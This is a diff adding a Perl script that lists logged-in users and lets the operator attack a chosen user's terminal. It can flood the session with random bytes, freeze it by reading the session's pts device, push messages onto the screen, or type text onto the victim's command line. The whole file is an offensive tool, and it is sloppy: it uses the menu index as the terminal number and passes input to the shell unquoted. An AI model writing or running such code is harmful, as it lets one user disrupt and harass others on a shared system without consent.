@@ -1,0 +1,92 @@
+#!/usr/bin/perl
+#use strict;
+#use warnings;
+
+my @users = qx(who);
+my @targets;
+#because the user may be logged in more than once, we will split the arrays into seperate lists rather than hashes
+foreach my $item (@users) {
+  @temp = split / /, $item;
+  foreach my $user_and_pty (@temp) {
+    if($user_and_pty =~ "^[a-zA-Z]"){
+    push (@targets,$user_and_pty);
+    }
+  }
+}
+my @user_list;
+my @term_list;
+foreach my $item (@targets) {
+  if($item =~ "pts") {
+  push(@term_list, $item);
+  } else {
+    push (@user_list, $item);
+    }
+}
+
+my $size = @user_list;
+my $i = 0;
+
+print "users | tty\n";
+print "-----------\n";
+while ($i < $size) {
+	print "$i: @user_list[$i]    @term_list[$i]\n";
+	$i++;
+}
+
+print "\nenter a target number\n";
+my $target_num = <>;
+chomp $target_num;
+if($target_num > $i - 1){
+  print "invalid number\n";
+}
+
+print "action required\n";
+
+print "Enter 1 for fuzzing there session\n";
+print "Enter 2 for freezing there session\n";
+print "Enter 3 to send a msg to there term\n";
+print "Enter 4 to type to there command line\n";
+
+
+my $sel = <>;
+chomp $sel;
+
+if ($sel != "1" && $sel != "2" && $sel != "3" && $sel != "4") {
+	exit (0);
+}
+
+print "terminal is pts $target_num\n";
+if($sel == "1"){
+	print "fuzzing /dev/pts/$target_num\n";
+	print "press CTRL+C to stop\n";
+	system("cat /dev/urandom > /dev/pts/$target_num");
+
+}
+
+if($sel == "2"){
+	print "freezing /dev/pts/$target_num\n";
+	print "press CTRL+C to stop\n";
+	system("cat /dev/pts/$target_num /dev/pts/$target_num /dev/pts/$target_num");
+}
+
+
+if($sel == "3"){
+	print "starting message sending to /dev/pts/$target_num\n";
+	print "press CTRL+C to stop\n";
+	while(1) {
+	my $ input = <>;
+	chomp $input;
+	system("echo $input > /dev/pts/$target_num");
+}
+}
+
+
+if($sel == "4"){
+	print "starting message send on command line to /dev/pts/$target_num\n";
+	print "press CTRL+C to stop\n";
+	while(1) {
+	my $ input = <>;
+	chomp $input;
+	system("echo -n $input > /dev/pts/$target_num");
+}
+}
